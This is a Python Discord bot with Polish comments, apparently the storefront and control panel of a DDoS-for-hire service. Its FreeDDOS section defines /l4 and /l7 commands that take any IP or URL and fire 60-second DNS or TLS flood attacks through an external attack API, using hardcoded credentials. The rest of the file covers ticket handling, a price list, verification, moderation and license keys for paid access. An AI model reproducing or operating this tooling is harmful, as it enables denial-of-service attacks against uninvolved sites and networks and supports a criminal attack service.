# -*- coding: utf-8 -*-
import discord
from discord.ext import commands
import random
import asyncio
import datetime
import io
from config import *
import aiohttp
from discord import app_commands

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

class CustomBot(commands.Bot):
    async def setup_hook(self):
        await self.add_cog(FreeDDOS(self))
        await self.add_cog(AdminLicenses(self))
        await self.add_cog(AdminCommands(self))
        await self.tree.sync()

bot = CustomBot(command_prefix='!', intents=intents)

# Słownik do przechowywania zadań matematycznych dla użytkowników
user_tasks = {}

# Słownik do przechowywania aktywnych ticketów
active_tickets = {}

# Słownik cooldownów dla FREE-DDOS
free_ddos_cooldowns = {}

# Klasa dla przycisku weryfikacji
class VerificationView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)  # Przycisk nigdy nie wygasa
    
    @discord.ui.button(label="Zweryfikuj się", style=discord.ButtonStyle.primary, custom_id="verify_button")
    async def verify_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await handle_verification(interaction)

# Klasa dla przycisku otwierania ticketu
class TicketView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label="Otwórz Ticket", style=discord.ButtonStyle.primary, custom_id="open_ticket")
    async def open_ticket_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await handle_ticket_creation(interaction)

# Klasa dla przycisku zamykania ticketu
class CloseTicketView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label="Zamknij Ticket", style=discord.ButtonStyle.danger, custom_id="close_ticket")
    async def close_ticket_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await handle_ticket_closing(interaction)

# Klasa dla przycisku cennika
class PriceListView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label="Zobacz Cennik", style=discord.ButtonStyle.primary, custom_id="view_prices")
    async def view_prices_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await handle_price_list(interaction)

class FreeDDOS(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="l4", description="Wysyła atak L4 na podany IP (port 53, metoda dns)")
    @app_commands.describe(ip="Adres IP celu")
    async def l4(self, interaction: discord.Interaction, ip: str):
        # Sprawdź kanał
        if interaction.channel.id != FREE_DDOS_CHANNEL_ID:
            await interaction.response.send_message(":x: Komenda dostępna tylko na wyznaczonym kanale!", ephemeral=True)
            return
        await self.handle_attack(interaction, ip, l7=False)

    @app_commands.command(name="l7", description="Wysyła atak L7 na podany URL (port 443, metoda tls)")
    @app_commands.describe(url="Adres URL celu")
    async def l7(self, interaction: discord.Interaction, url: str):
        # Sprawdź kanał
        if interaction.channel.id != FREE_DDOS_CHANNEL_ID:
            await interaction.response.send_message(":x: Komenda dostępna tylko na wyznaczonym kanale!", ephemeral=True)
            return
        await self.handle_attack(interaction, url, l7=True)

    @app_commands.command(name="ping", description="Sprawdź ping bota do Discorda")
    async def ping(self, interaction: discord.Interaction):
        latency = round(self.bot.latency * 1000)
        await interaction.response.send_message(f"?? Pong! Opóźnienie: {latency}ms", ephemeral=True)

    async def handle_attack(self, interaction, target, l7: bool):
        target = str(target).split()[0]
        user = interaction.user
        guild = interaction.guild

        # Sprawdź rolę
        role = discord.utils.get(user.roles, id=FREE_DDOS_ROLE_ID)
        if not role:
            await interaction.response.send_message(":x: Nie masz uprawnień do tej komendy!", ephemeral=True)
            return
        # Cooldown
        now = discord.utils.utcnow()
        last = free_ddos_cooldowns.get(user.id, None)
        if last and (now - last).total_seconds() < 60:
            await interaction.response.send_message(f":hourglass_flowing_sand: Musisz odczekać {int(60 - (now - last).total_seconds())}s przed kolejnym atakiem!", ephemeral=True)
            return
        free_ddos_cooldowns[user.id] = now

        # Sprawdź blokadę celu
        check2_url = f"http://109.71.252.83:4444/check2?host={target}"
        async with aiohttp.ClientSession() as session:
            async with session.get(check2_url) as resp:
                data = await resp.json()
                if data.get("blocked"):
                    await interaction.response.send_message(":x: Ten cel jest zablokowany! Atak nie został wysłany.", ephemeral=True)
                    await self.log_attack(user, target, l7, blocked=True)
                    return
        # Pobierz info o celu
        check_url = f"http://109.71.252.83:4444/check?host={target}"
        async with aiohttp.ClientSession() as session:
            async with session.get(check_url) as resp:
                info = await resp.json()
        # Wyślij atak
        if l7:
            api_url = f"http://proxy.7network.fun:8080/api/attack?username=free&password=free123&target={target}&port=443&time=60&method=tls"
            method = "tls"
            port = 443
        else:
            api_url = f"http://proxy.7network.fun:8080/api/attack?username=free&password=free123&target={target}&port=53&time=60&method=dns"
            method = "dns"
            port = 53
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as resp:
                api_data = await resp.json()
        # Odpowiedź
        error = api_data.get("error", True)
        msg = api_data.get("message", {})
        slots = msg.get("your_running_attacks", "?") if isinstance(msg, dict) else "?"
        embed = discord.Embed(
            title=":white_check_mark: Wysłano atak" if not error else ":x: Błąd wysyłania ataku",
            color=0x00ff00 if not error else 0xff0000
        )
        embed.add_field(name=":clipboard: Target", value=str(target))
        embed.add_field(name=":pushpin: Port", value=str(port))
        embed.add_field(name=":hourglass: Time", value="60s")
        embed.add_field(name=":repeat: Method", value=method)
        embed.add_field(name=":busts_in_silhouette: Sloty", value=slots)
        embed.add_field(name=":page_facing_up: Status API", value="OK" if not error else "ERROR")
        if isinstance(info, dict):
            embed.add_field(name=":mag: IP", value=info.get("ip", "-"))
            embed.add_field(name=":satellite: ISP", value=info.get("isp", "-"))
        # Jeśli nie ma błędu, wyślij embed publicznie z treścią komendy
        if not error:
            if l7:
                cmd_content = f"/l7 {target}"
            else:
                cmd_content = f"/l4 {target}"
            await interaction.response.send_message(content=f"{interaction.user.mention} użył komendy: `{cmd_content}`", embed=embed)
        else:
            await interaction.response.send_message(embed=embed, ephemeral=True)
        await self.log_attack(user, target, l7, blocked=False, api_data=api_data, info=info)

    async def log_attack(self, user, target, l7, blocked=False, api_data=None, info=None):
        channel = self.bot.get_channel(FREE_DDOS_LOGS_CHANNEL_ID)
        embed = discord.Embed(
            title=":warning: [FREE-DDOS] Próba ataku" if blocked else ":white_check_mark: [FREE-DDOS] Wysłano atak",
            color=0xff0000 if blocked else 0x00ff00
        )
        embed.add_field(name=":bust_in_silhouette: Użytkownik", value=f"{user} ({user.id})")
        embed.add_field(name=":repeat: Typ", value="L7" if l7 else "L4")
        embed.add_field(name=":clipboard: Target", value=str(target))
        if info:
            embed.add_field(name=":mag: IP", value=info.get("ip", "-"))
            embed.add_field(name=":satellite: ISP", value=info.get("isp", "-"))
        if api_data:
            embed.add_field(name=":question: API error", value=str(api_data.get("error")))
            embed.add_field(name=":memo: API msg", value=str(api_data.get("message")))
        if blocked:
            embed.add_field(name=":lock: Blokada", value="TAK")
        await channel.send(embed=embed)

# --- USUWANIE STARYCH WIADOMOŚCI I WYSYŁANIE NOWYCH PO RESECIE ---
async def clear_and_send(channel_id, send_func):
    channel = bot.get_channel(channel_id)
    if channel:
        async for message in channel.history(limit=20):
            if message.author == bot.user:
                await message.delete()
        await send_func()

@bot.event
async def on_ready():
    print(f'{bot.user} został uruchomiony!')
    
    # Ustawienie statusu bota
    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching,
        name="7network.fun"
    ))
    
    # Dodaj persistent views
    bot.add_view(VerificationView())
    bot.add_view(TicketView())
    bot.add_view(CloseTicketView())
    bot.add_view(PriceListView())
    
    # Usuwanie starych i wysyłanie nowych wiadomości
    await clear_and_send(VERIFICATION_CHANNEL_ID, send_verification_message)
    await clear_and_send(TICKET_CHANNEL_ID, send_ticket_message)
    await clear_and_send(PRICE_LIST_CHANNEL_ID, send_price_list_message)

async def send_ticket_message():
    try:
        channel = bot.get_channel(TICKET_CHANNEL_ID)
        if channel:
            # Stwórz embed z przyciskiem
            embed = discord.Embed(
                title=":ticket: System Ticketów",
                description="Jeśli chcesz coś zakupić lub masz pytanie, kliknij przycisk poniżej aby otworzyć ticket.",
                color=0x0099ff
            )
            embed.add_field(name=":clipboard: Informacje", value="• Maksymalnie 1 aktywny ticket na użytkownika\n• Administracja odpowie najszybciej jak to możliwe\n• Ticket zostanie zamknięty po rozwiązaniu sprawy", inline=False)
            view = TicketView()
            await channel.send(embed=embed, view=view)
            print("Wiadomość o ticketach została wysłana!")
    except Exception as e:
        print(f"Błąd podczas wysyłania wiadomości o ticketach: {e}")

async def handle_ticket_creation(interaction):
    """Obsługa tworzenia ticketu"""
    user = interaction.user
    guild = interaction.guild
    
    # Sprawdź czy użytkownik już ma aktywny ticket
    if user.id in active_tickets:
        await interaction.response.send_message("? Masz już aktywny ticket! Zamknij go przed utworzeniem nowego.", ephemeral=True)
        return
    
    try:
        # Pobierz kategorię ticketów
        category = guild.get_channel(TICKET_CATEGORY_ID)
        if not category:
            await interaction.response.send_message("? Nie można znaleźć kategorii ticketów.", ephemeral=True)
            return
        
        # Utwórz kanał ticketu
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            user: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True, manage_channels=True)
        }
        
        # Dodaj uprawnienia dla roli admin
        admin_role = guild.get_role(ADMIN_ROLE_ID)
        if admin_role:
            overwrites[admin_role] = discord.PermissionOverwrite(read_messages=True, send_messages=True, manage_channels=True)
        
        channel = await guild.create_text_channel(
            f"ticket-{user.name}",
            category=category,
            overwrites=overwrites
        )
        
        # Zapisz informacje o tickecie
        active_tickets[user.id] = {
            'channel_id': channel.id,
            'user_id': user.id,
            'created_at': datetime.datetime.now(),
            'messages': []
        }
        
        # Wyślij wiadomość powitalną
        embed = discord.Embed(
            title=":ticket: Ticket utworzony!",
            description=f"Witaj {user.mention}!\n\nAdministracja zostanie powiadomiona i skontaktuje się z Tobą najszybciej jak to możliwe.\n\n**Pamiętaj:**\n• Opisz dokładnie swój problem/zapytanie\n• Bądź cierpliwy\n• Nie spamuj",
            color=0x00ff00
        )
        embed.set_footer(text=f"Ticket utworzony przez {user.name}")
        
        # Stwórz view z przyciskiem zamykania
        view = CloseTicketView()
        
        await channel.send(content="@everyone", embed=embed, view=view)
        
        await interaction.response.send_message(":white_check_mark: Ticket został utworzony! Sprawdź kanał {channel.mention}", ephemeral=True)
        
        print(f"Ticket utworzony dla {user.name} w kanale {channel.name}")
        
    except Exception as e:
        print(f"Błąd podczas tworzenia ticketu: {e}")
        await interaction.response.send_message("? Wystąpił błąd podczas tworzenia ticketu.", ephemeral=True)

async def handle_ticket_closing(interaction):
    """Obsługa zamykania ticketu"""
    user = interaction.user
    channel = interaction.channel
    
    # Sprawdź czy użytkownik ma uprawnienia do zamykania
    admin_role = interaction.guild.get_role(ADMIN_ROLE_ID)
    if not admin_role or admin_role not in user.roles:
        await interaction.response.send_message("? Nie masz uprawnień do zamykania ticketów.", ephemeral=True)
        return
    
    # Znajdź użytkownika ticketu
    ticket_user_id = None
    for user_id, ticket_info in active_tickets.items():
        if ticket_info['channel_id'] == channel.id:
            ticket_user_id = user_id
            break
    
    if not ticket_user_id:
        await interaction.response.send_message("? Nie można znaleźć informacji o tym tickecie.", ephemeral=True)
        return
    
    # Najpierw wyślij odpowiedź na interakcję
    await interaction.response.send_message("?? Zamykanie ticketu i generowanie transkryptu...", ephemeral=True)
    
    # Pobierz historię wiadomości
    messages = []
    async for message in channel.history(limit=None, oldest_first=True):
        if not message.author.bot or message.content != "@everyone":
            messages.append({
                'author': message.author.name,
                'content': message.content,
                'timestamp': message.created_at.strftime("%Y-%m-%d %H:%M:%S"),
                'attachments': [att.url for att in message.attachments]
            })
    
    # Utwórz transkrypt
    transcript_content = f"Transkrypt ticketu - {channel.name}\n"
    transcript_content += f"Utworzony: {active_tickets[ticket_user_id]['created_at'].strftime('%Y-%m-%d %H:%M:%S')}\n"
    transcript_content += f"Zamknięty: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    transcript_content += f"Zamknięty przez: {user.name}\n"
    transcript_content += "=" * 50 + "\n\n"
    
    for msg in messages:
        transcript_content += f"[{msg['timestamp']}] {msg['author']}: {msg['content']}\n"
        if msg['attachments']:
            transcript_content += f"[Załączniki: {', '.join(msg['attachments'])}]\n"
        transcript_content += "\n"
    
    # Utwórz plik transkryptu
    transcript_file = discord.File(
        io.BytesIO(transcript_content.encode('utf-8')),
        filename=f"transcript-{channel.name}-{datetime.datetime.now().strftime('%Y%m%d-%H%M%S')}.txt"
    )
    
    # Wyślij transkrypt na kanał logów
    logs_channel = bot.get_channel(TICKET_LOGS_CHANNEL_ID)
    if logs_channel:
        embed = discord.Embed(
            title=":page_facing_up: Ticket zamknięty",
            description=f"**Kanał:** {channel.name}\n**Utworzony przez:** <@{ticket_user_id}>\n**Zamknięty przez:** {user.mention}",
            color=0xff0000
        )
        embed.add_field(name=":calendar: Czas utworzenia", value=active_tickets[ticket_user_id]['created_at'].strftime('%Y-%m-%d %H:%M:%S'), inline=True)
        embed.add_field(name=":calendar: Czas zamknięcia", value=datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'), inline=True)
        
        await logs_channel.send(embed=embed, file=transcript_file)
    
    # Wyślij transkrypt do użytkownika na PV
    try:
        ticket_user = bot.get_user(ticket_user_id)
        if ticket_user:
            user_embed = discord.Embed(
                title=":ticket: Ticket zamknięty",
                description="Twój ticket został zamknięty przez administrację.",
                color=0xff0000
            )
            user_embed.add_field(name=":bust_in_silhouette: Zamknięty przez", value=user.name, inline=True)
            user_embed.add_field(name=":calendar: Czas zamknięcia", value=datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'), inline=True)
            
            await ticket_user.send(embed=user_embed, file=transcript_file)
    except Exception as e:
        print(f"Nie można wysłać transkryptu do użytkownika: {e}")
    
    # Usuń ticket z pamięci
    del active_tickets[ticket_user_id]
    
    # Usuń kanał
    try:
        await channel.delete()
        print(f"Ticket {channel.name} został zamknięty przez {user.name}")
    except Exception as e:
        print(f"Błąd podczas usuwania kanału: {e}")

async def send_verification_message():
    try:
        channel = bot.get_channel(VERIFICATION_CHANNEL_ID)
        if channel:
            embed = discord.Embed(
                title=":lock: Weryfikacja",
                description="Kliknij w przycisk aby się zweryfikować",
                color=0x00ff00
            )
            view = VerificationView()
            await channel.send(embed=embed, view=view)
            print("Wiadomość weryfikacyjna została wysłana!")
    except Exception as e:
        print(f"Błąd podczas wysyłania wiadomości weryfikacyjnej: {e}")

async def handle_verification(interaction):
    """Obsługa procesu weryfikacji"""
    user = interaction.user
    
    # Sprawdź czy użytkownik już ma rolę
    guild = interaction.guild
    verified_role = guild.get_role(VERIFIED_ROLE_ID)
    
    if verified_role in user.roles:
        await interaction.response.send_message("Jesteś już zweryfikowany!", ephemeral=True)
        return
    
    # Generuj zadanie matematyczne
    num1 = random.randint(1, 20)
    num2 = random.randint(1, 20)
    operation = '+'
    
    answer = num1 + num2
    
    # Zapisz zadanie dla użytkownika
    user_tasks[user.id] = answer
    
    # Wyślij wiadomość prywatną
    embed = discord.Embed(
        title=":1234: Zadanie matematyczne",
        description=f"Rozwiąż to zadanie: **{num1} {operation} {num2} = ?**\n\nOdpowiedz na tę wiadomość z wynikiem.",
        color=0x0099ff
    )
    
    try:
        await user.send(embed=embed)
        await interaction.response.send_message("Sprawdź wiadomości prywatne od bota!", ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message("Nie mogę wysłać Ci wiadomości prywatnej. Sprawdź czy masz włączone wiadomości prywatne!", ephemeral=True)

@bot.event
async def on_message(message):
    """Obsługa wiadomości prywatnych z odpowiedziami na zadania"""
    if message.author == bot.user:
        return
    
    # Sprawdź czy to wiadomość prywatna
    if isinstance(message.channel, discord.DMChannel):
        user_id = message.author.id
        
        if user_id in user_tasks:
            try:
                user_answer = int(message.content.strip())
                correct_answer = user_tasks[user_id]
                
                if user_answer == correct_answer:
                    # Znajdź serwer i dodaj rolę
                    guild = bot.get_guild(GUILD_ID)
                    if guild:
                        member = guild.get_member(user_id)
                        verified_role = guild.get_role(VERIFIED_ROLE_ID)
                        
                        if member and verified_role:
                            await member.add_roles(verified_role)
                            
                            success_embed = discord.Embed(
                                title=":white_check_mark: Weryfikacja udana!",
                                description="Otrzymałeś rolę zweryfikowanego użytkownika!",
                                color=0x00ff00
                            )
                            await message.channel.send(embed=success_embed)
                        else:
                            await message.channel.send("? Wystąpił błąd podczas nadawania roli.")
                    else:
                        await message.channel.send("? Nie można znaleźć serwera.")
                else:
                    error_embed = discord.Embed(
                        title=":x: Błędna odpowiedź",
                        description=f"Twoja odpowiedź: {user_answer}\nPoprawna odpowiedź: {correct_answer}\n\nSpróbuj ponownie!",
                        color=0xff0000
                    )
                    await message.channel.send(embed=error_embed)
                    
                    # Generuj nowe zadanie
                    num1 = random.randint(1, 20)
                    num2 = random.randint(1, 20)
                    operation = '+'
                    
                    answer = num1 + num2
                    
                    user_tasks[user_id] = answer
                    
                    new_task_embed = discord.Embed(
                        title=":1234: Nowe zadanie matematyczne",
                        description=f"Rozwiąż to zadanie: **{num1} {operation} {num2} = ?**",
                        color=0x0099ff
                    )
                    await message.channel.send(embed=new_task_embed)
                
                # Usuń zadanie z pamięci
                del user_tasks[user_id]
                
            except ValueError:
                await message.channel.send(":x: Proszę podać liczbę całkowitą jako odpowiedź.")
    
    await bot.process_commands(message)

class AdminCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def admin_only():
        async def predicate(interaction: discord.Interaction):
            admin_role = discord.utils.get(interaction.user.roles, id=ADMIN_ROLE_ID)
            return admin_role is not None
        return app_commands.check(predicate)

    @app_commands.command(name="status", description="Zmienia status bota (admin only)")
    @app_commands.describe(new_status="Nowy status bota")
    @admin_only()
    async def status(self, interaction: discord.Interaction, new_status: str):
        await self.bot.change_presence(activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=new_status
        ))
        await interaction.response.send_message(f"✅ Status bota został zmieniony na: {new_status}", ephemeral=True)

    @app_commands.command(name="weryfikacja", description="Ponownie wysyła wiadomość weryfikacyjną (admin only)")
    @admin_only()
    async def weryfikacja(self, interaction: discord.Interaction):
        await send_verification_message()
        await interaction.response.send_message("✅ Wiadomość weryfikacyjna została ponownie wysłana!", ephemeral=True)

    @app_commands.command(name="ticket", description="Ponownie wysyła wiadomość o ticketach (admin only)")
    @admin_only()
    async def ticket(self, interaction: discord.Interaction):
        await send_ticket_message()
        await interaction.response.send_message("✅ Wiadomość o ticketach została ponownie wysłana!", ephemeral=True)

    @app_commands.command(name="cennik", description="Ponownie wysyła wiadomość o cenniku (admin only)")
    @admin_only()
    async def cennik(self, interaction: discord.Interaction):
        await send_price_list_message()
        await interaction.response.send_message("✅ Wiadomość o cenniku została ponownie wysłana!", ephemeral=True)

    @app_commands.command(name="ban", description="Banuje użytkownika i wysyła mu powód na priv w embedzie.")
    @app_commands.describe(member="Użytkownik do zbanowania", reason="Powód bana (opcjonalnie)")
    @admin_only()
    async def ban(self, interaction: discord.Interaction, member: discord.Member, reason: str = None):
        if member == interaction.user:
            await interaction.response.send_message(":x: Nie możesz zbanować samego siebie!", ephemeral=True)
            return
        if reason is None:
            reason = "Nie podano powodu."
        # DM before ban
        try:
            embed = discord.Embed(title=":no_entry: Zostałeś zbanowany!", color=0xff0000)
            embed.add_field(name=":page_facing_up: Powód", value=reason, inline=False)
            embed.set_footer(text=f"Ban na serwerze: {interaction.guild.name}")
            await member.send(embed=embed)
        except Exception:
            pass
        # Ban
        try:
            await member.ban(reason=reason)
            await interaction.response.send_message(f"✅ Użytkownik {member.mention} został zbanowany. Powód: {reason}", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f":x: Nie udało się zbanować użytkownika: {e}", ephemeral=True)

    @app_commands.command(name="kick", description="Wyrzuca użytkownika i wysyła mu powód na priv w embedzie.")
    @app_commands.describe(member="Użytkownik do wyrzucenia", reason="Powód kicka (opcjonalnie)")
    @admin_only()
    async def kick(self, interaction: discord.Interaction, member: discord.Member, reason: str = None):
        if member == interaction.user:
            await interaction.response.send_message(":x: Nie możesz wyrzucić samego siebie!", ephemeral=True)
            return
        if reason is None:
            reason = "Nie podano powodu."
        # DM before kick
        try:
            embed = discord.Embed(title=":boot: Zostałeś wyrzucony!", color=0xffa500)
            embed.add_field(name=":page_facing_up: Powód", value=reason, inline=False)
            embed.set_footer(text=f"Kick z serwera: {interaction.guild.name}")
            await member.send(embed=embed)
        except Exception:
            pass
        # Kick
        try:
            await member.kick(reason=reason)
            await interaction.response.send_message(f"✅ Użytkownik {member.mention} został wyrzucony. Powód: {reason}", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f":x: Nie udało się wyrzucić użytkownika: {e}", ephemeral=True)

API_BASE = "http://proxy.7network.fun:6969"
OWNER_KEY = "sejzik"

class AdminLicenses(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def admin_only():
        async def predicate(interaction: discord.Interaction):
            admin_role = discord.utils.get(interaction.user.roles, id=ADMIN_ROLE_ID)
            return admin_role is not None
        return app_commands.check(predicate)

    @app_commands.command(name="gen-licka", description="Generuje licencję dla użytkownika Discord na określoną ilość dni.")
    @app_commands.describe(discord_id="ID użytkownika Discord", days="Ilość dni")
    @admin_only()
    async def gen_licka(self, interaction: discord.Interaction, discord_id: str, days: int):
        url = f"{API_BASE}/generatelicense?ownerkey={OWNER_KEY}&discord={discord_id}&days={days}"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=3) as resp:
                    data = await resp.json()
            license_code = data.get("license", "-")
            expiry = data.get("expiry_date", "-")
            # Embed dla admina (bez tutoriala)
            admin_embed = discord.Embed(title=":white_check_mark: Licencja wygenerowana", color=0x00ff00)
            admin_embed.add_field(name=":key: Kod licencji", value=f"||{license_code}||", inline=False)
            admin_embed.add_field(name=":bust_in_silhouette: Discord ID", value=discord_id, inline=False)
            admin_embed.add_field(name=":calendar: Ważna do", value=expiry, inline=False)
            await interaction.response.send_message(embed=admin_embed, ephemeral=True)
            # Embed dla użytkownika (z tutorialem)
            guild = interaction.guild
            member = guild.get_member(int(discord_id)) if guild else None
            if member:
                try:
                    user_embed = discord.Embed(title=":white_check_mark: Twoja licencja została wygenerowana!", color=0x00ff00)
                    user_embed.add_field(name=":key: Kod licencji", value=f"||{license_code}||", inline=False)
                    user_embed.add_field(name=":calendar: Ważna do", value=expiry, inline=False)
                    user_embed.add_field(name=":link: Pobierz klienta", value="https://lightnetwork.fun/download", inline=False)
                    user_embed.add_field(name=":information_source: Jak się zalogować?", value=f"1. Wejdź na stronę https://lightnetwork.fun i zaloguj się kodem licencji.\n2. W BombaModzie wpisz `/zaloguj {license_code}`.", inline=False)
                    await member.send(embed=user_embed)
                except Exception:
                    await interaction.followup.send(":x: Nie mogę wysłać licencji na priv do użytkownika. Sprawdź czy ma włączone wiadomości prywatne!", ephemeral=True)
        except Exception:
            embed = discord.Embed(title=":x: API leży, zobacz backend śmieciu", color=0xff0000)
            await interaction.response.send_message(embed=embed, ephemeral=True)

    @app_commands.command(name="check-licka", description="Sprawdza szczegóły licencji.")
    @app_commands.describe(license="Kod licencji")
    @admin_only()
    async def check_licka(self, interaction: discord.Interaction, license: str):
        url = f"{API_BASE}/check?license={license}"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=3) as resp:
                    data = await resp.json()
            embed = discord.Embed(title=":mag: Szczegóły licencji", color=0x0099ff)
            if data.get("exists"):
                embed.add_field(name=":key: Licencja", value=license)
                embed.add_field(name=":bust_in_silhouette: Discord ID", value=data.get("discord_id", "-"))
                embed.add_field(name=":calendar: Utworzona", value=data.get("created_at", "-"))
                embed.add_field(name=":calendar: Ważna do", value=data.get("expiry_date", "-"))
                embed.add_field(name=":hourglass: Dni do końca", value=str(data.get("days_left", "-")))
                embed.add_field(name=":no_entry_sign: Zbanowana", value=str(data.get("is_blacklisted", False)))
                embed.add_field(name=":lock: Wygasła", value=str(data.get("is_expired", False)))
                embed.add_field(name=":bookmark_tabs: Status", value=data.get("status", "-"))
            else:
                embed.description = ":x: Licencja nie istnieje."
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except Exception:
            embed = discord.Embed(title=":x: API leży, zobacz backend śmieciu", color=0xff0000)
            await interaction.response.send_message(embed=embed, ephemeral=True)

    @app_commands.command(name="ban-licka", description="Banuje licencję.")
    @app_commands.describe(license="Kod licencji")
    @admin_only()
    async def ban_licka(self, interaction: discord.Interaction, license: str):
        url = f"{API_BASE}/banlicense?ownerkey={OWNER_KEY}&license={license}"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=3) as resp:
                    data = await resp.json()
            embed = discord.Embed(title=":no_entry: Licencja zbanowana", color=0xff0000)
            embed.add_field(name=":key: Licencja", value=data.get("license", "-"))
            embed.add_field(name=":bookmark_tabs: Status", value=data.get("status", "-"))
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except Exception:
            embed = discord.Embed(title=":x: API leży, zobacz backend śmieciu", color=0xff0000)
            await interaction.response.send_message(embed=embed, ephemeral=True)

    @app_commands.command(name="unban-licka", description="Odbanowuje licencję.")
    @app_commands.describe(license="Kod licencji")
    @admin_only()
    async def unban_licka(self, interaction: discord.Interaction, license: str):
        url = f"{API_BASE}/unbanlicense?ownerkey={OWNER_KEY}&license={license}"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=3) as resp:
                    data = await resp.json()
            embed = discord.Embed(title=":unlock: Licencja odbanowana", color=0x00ff00)
            embed.add_field(name=":key: Licencja", value=data.get("license", "-"))
            embed.add_field(name=":bookmark_tabs: Status", value=data.get("status", "-"))
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except Exception:
            embed = discord.Embed(title=":x: API leży, zobacz backend śmieciu", color=0xff0000)
            await interaction.response.send_message(embed=embed, ephemeral=True)

    @app_commands.command(name="check-user", description="Sprawdza licencję przypisaną do użytkownika Discord.")
    @app_commands.describe(discord_id="ID użytkownika Discord")
    @admin_only()
    async def check_user(self, interaction: discord.Interaction, discord_id: str):
        url = f"{API_BASE}/id?discordid={discord_id}"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=3) as resp:
                    data = await resp.json()
            embed = discord.Embed(title=":mag: Licencja użytkownika", color=0x0099ff)
            if data.get("exists"):
                embed.add_field(name=":key: Licencja", value=data.get("license", "-"), inline=False)
            else:
                embed.description = ":x: Użytkownik nie posiada licencji."
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except Exception:
            embed = discord.Embed(title=":x: API leży, zobacz backend śmieciu", color=0xff0000)
            await interaction.response.send_message(embed=embed, ephemeral=True)

    @app_commands.command(name="commands", description="Wyświetla listę komend admina i ich opisy.")
    @admin_only()
    async def commands_list(self, interaction: discord.Interaction):
        embed = discord.Embed(title=":gear: Komendy admina", color=0x5865F2)
        embed.add_field(name="/gen-licka [discord id] [days]", value="Generuje licencję na określoną ilość dni.", inline=False)
        embed.add_field(name="/check-licka [licencja]", value="Sprawdza szczegóły licencji.", inline=False)
        embed.add_field(name="/ban-licka [licencja]", value="Banuje licencję.", inline=False)
        embed.add_field(name="/unban-licka [licencja]", value="Odbanowuje licencję.", inline=False)
        embed.add_field(name="/check-user [discord id]", value="Pokazuje licencję przypisaną do użytkownika.", inline=False)
        embed.add_field(name="/commands", value="Wyświetla tę listę komend.", inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

async def setup(bot):
    await bot.add_cog(AdminLicenses(bot))
    await setup_admin_commands(bot)

# Uruchomienie bota
if __name__ == "__main__":
    if not TOKEN:
        print("Błąd: Nie ustawiono tokenu bota w pliku .env")
        exit(1)
    
    bot.run(TOKEN) 